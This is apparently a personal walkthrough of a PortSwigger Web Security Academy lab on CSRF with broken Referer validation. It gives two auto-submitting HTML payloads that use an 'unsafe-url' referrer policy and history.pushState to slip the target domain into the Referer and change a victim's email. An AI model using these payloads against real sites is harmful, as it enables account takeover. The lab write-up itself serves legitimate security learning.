# [CSRF] Lab: CSRF with broken Referer validation (1)

---

![Untitled](%5BCSRF%5D%20Lab%20CSRF%20with%20broken%20Referer%20validation%20(1)%20c80228f335024a04b09fcaf6b98437cf/Untitled.png)

header present: 

![Untitled](%5BCSRF%5D%20Lab%20CSRF%20with%20broken%20Referer%20validation%20(1)%20c80228f335024a04b09fcaf6b98437cf/Untitled%201.png)

lets create simple CSRF PoC to see what the referer is set to when viewing the exploit. 

![Untitled](%5BCSRF%5D%20Lab%20CSRF%20with%20broken%20Referer%20validation%20(1)%20c80228f335024a04b09fcaf6b98437cf/Untitled%202.png)

so we will need to use the history state let mess around with that. 

`history.replaceState(state, title, URL)` the browser by default will prevent us from manipulating the referer header, so we need to use 

	 `<meta name="referrer" content="unsafe-url">`

in our CSRF payload. 

```jsx
<html>
	 <meta name="referrer" content="unsafe-url">
   <script> history.replaceState(null, ' ', 'testing')</script>
  <body>
    <form action="https://0a93004804d226d180411c67003500a1.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="t&#64;tt&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.replaceState(null, ' ', 'testing')
      document.forms[0].submit();
    </script>
  </body>
</html>

```

![Untitled](%5BCSRF%5D%20Lab%20CSRF%20with%20broken%20Referer%20validation%20(1)%20c80228f335024a04b09fcaf6b98437cf/Untitled%203.png)

noting the ending now lets try adding the lab URL to the URL in the `history.replaceState()` 

![Untitled](%5BCSRF%5D%20Lab%20CSRF%20with%20broken%20Referer%20validation%20(1)%20c80228f335024a04b09fcaf6b98437cf/Untitled%204.png)

and it worked now lets deliver this exploit to our victim. 

![Untitled](%5BCSRF%5D%20Lab%20CSRF%20with%20broken%20Referer%20validation%20(1)%20c80228f335024a04b09fcaf6b98437cf/Untitled%205.png)

```jsx
<html>
    <meta name="referrer" content="unsafe-url">
    <body>
        <script>history.pushState('','','/?0a93004804d226d180411c67003500a1.web-security-academy.net/my-account')</script>
        <h1>Hello World!</h1>
        <form action="https://0a93004804d226d180411c67003500a1.web-security-academy.net/my-account/change-email" method="post" id="csrf-form">
            <input type="hidden" name="email" value="test5@test.ca">
        </form>

        <script>document.getElementById("csrf-form").submit()</script>
    </body>
</html>
```

![Untitled](%5BCSRF%5D%20Lab%20CSRF%20with%20broken%20Referer%20validation%20(1)%20c80228f335024a04b09fcaf6b98437cf/Untitled%206.png)

**NOTE PLEASE MAKE SURE THE EXPLOIT IS WORKING FIRST.**